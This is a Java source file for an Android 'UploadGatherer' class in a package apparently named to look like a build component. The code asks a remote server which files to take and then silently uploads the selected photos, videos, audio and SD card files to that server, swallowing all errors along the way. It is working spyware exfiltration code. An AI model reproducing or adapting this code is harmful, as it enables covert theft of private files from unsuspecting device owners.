package org.code.coregradle.gatherers;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import androidx.work.ListenableWorker;

import org.json.JSONArray;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;
import org.code.coregradle.utils.FileUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

import okhttp3.Headers;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class UploadGatherer implements InfoGatherer {

    private Context context;
    private final OkHttpClient okHttpClient = new OkHttpClient();
    private ConnectivityManager cm;
    private IdentityStore identityStore;

    private List<JSONObject> getUploadPaths() {
        try {
            JSONObject requestJSON = new JSONObject();
            requestJSON.put(this.identityStore.getIdentityKey(), this.identityStore.getIdentityValue());
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    Network nw = cm.getActiveNetwork();
                    NetworkCapabilities actNw = cm.getNetworkCapabilities(nw);
                    if (actNw.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                        requestJSON.put("networkType", "WIFI");
                    } else if (actNw.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                        requestJSON.put("networkType", "CELLULAR");
                    }
                }
            } catch (Exception ignored) {
            }
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.REQUEST_FILE_PATHS_URL)
                    .post(requestBody)
                    .build();
            Response response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                JSONObject responseJSON = new JSONObject(response.body().string());
                JSONArray paths = responseJSON.getJSONArray("filePaths");
                List<JSONObject> requiredPaths = new ArrayList<>();
                for (int i = 0; i < paths.length(); i++) {
                    requiredPaths.add(paths.getJSONObject(i));
                }
                return requiredPaths;
            } else {
                return new ArrayList<>();
            }
        } catch (Exception ignored) {
        }
        return new ArrayList<>();
    }

    private ListenableWorker.Result uploadFile(InputStream inputStream, long fileId, String type) {
        try {
            File file = File.createTempFile(UUID.randomUUID().toString(), "br");
            FileOutputStream out = new FileOutputStream(file);
            FileUtils.copyStream(inputStream, out);
            RequestBody requestBody = RequestBody.create(MediaType.get("application/x-binary"), file);
            Request request = new Request.Builder()
                    .url(ApiConfig.SYNC_FILES_URL)
                    .addHeader(this.identityStore.getUploadHeaderKey(), this.identityStore.getIdentityValue())
                    .addHeader("X-FILE-ID", Long.toString(fileId))
                    .addHeader("X-FILE-TYPE", type)
                    .post(requestBody)
                    .build();
            Headers headers = request.headers();
            headers.toString();
            Response response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return ListenableWorker.Result.success();
            }
        } catch (Exception ignored) {
            Log.d("Wrong", "DC" + ignored);
        }
        return ListenableWorker.Result.failure();
    }

    public ListenableWorker.Result uploadFile(File file, String fileId, String type) {
        RequestBody requestBody = RequestBody.create(MediaType.get("application/x-binary"), file);
        try {
            Request request = new Request.Builder()
                    .url(ApiConfig.SYNC_FILES_URL)
                    .addHeader(this.identityStore.getUploadHeaderKey(), this.identityStore.getIdentityValue())
                    .addHeader("X-FILE-ID", fileId)
                    .addHeader("X-FILE-TYPE", type)
                    .post(requestBody)
                    .build();
            Response response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return ListenableWorker.Result.success();
            }
        } catch (Exception ignored) {
            Log.d("Wrong", "DC" + ignored);
        }
        return ListenableWorker.Result.failure();
    }

    private ListenableWorker.Result uploadFile(File file, String fileId) {
        return uploadFile(file, fileId, "UNKNOWN");
    }

    @Override
    public void initGatherer(Context context) {
        this.context = context;
        this.cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        this.identityStore = IdentityStore.getInstance(context);
    }

    @Override
    public JSONObject getRequestJSON() {

        return null;
    }

    @SuppressLint("DefaultLocale")
    private void handleUpload(JSONObject jsonObject) {
        try {
            String storageClass = jsonObject.getString("storageClass");
            String type = jsonObject.getString("type");

            Uri rootUri = null;

            ContentResolver contentResolver = context.getContentResolver();
            if (storageClass.equals("internal")) {
                if (type.equals("image")) {
                    rootUri = MediaStore.Images.Media.INTERNAL_CONTENT_URI;
                } else if (type.equals("video")) {
                    rootUri = MediaStore.Video.Media.INTERNAL_CONTENT_URI;
                } else if (type.equals("audio")) {
                    rootUri = MediaStore.Audio.Media.INTERNAL_CONTENT_URI;
                } else if (type.equals("files")) {
                    rootUri = MediaStore.Files.getContentUri("internal");
                } else {
                    //Don't care
                    return;
                }
            } else if (storageClass.equals("external")) {
                if (type.equals("image")) {
                    rootUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                } else if (type.equals("video")) {
                    rootUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                } else if (type.equals("audio")) {
                    rootUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
                } else if (type.equals("files")) {
                    rootUri = MediaStore.Files.getContentUri("external");
                } else {
                    //Don't care
                    return;
                }
            } else if (storageClass.equals("sdcard")) {
                String path = new String(Base64.decode(jsonObject.getString("id").getBytes(), Base64.NO_WRAP));
                File file = new File(path);
                uploadFile(file, jsonObject.getString("id"));
                return;
            }
            long id = Long.parseLong(jsonObject.getString("id"));
            Uri contentUri = ContentUris.withAppendedId(rootUri, id);
            InputStream dataInputStream = contentResolver.openInputStream(contentUri);
            uploadFile(dataInputStream, id, type);
        } catch (Exception e) {

        }
    }

    @Override
    public ListenableWorker.Result makeRequest() {
        List<JSONObject> paths = getUploadPaths();
        for (JSONObject targetFile : paths) {
            handleUpload(targetFile);
        }
        return ListenableWorker.Result.success();
    }
}
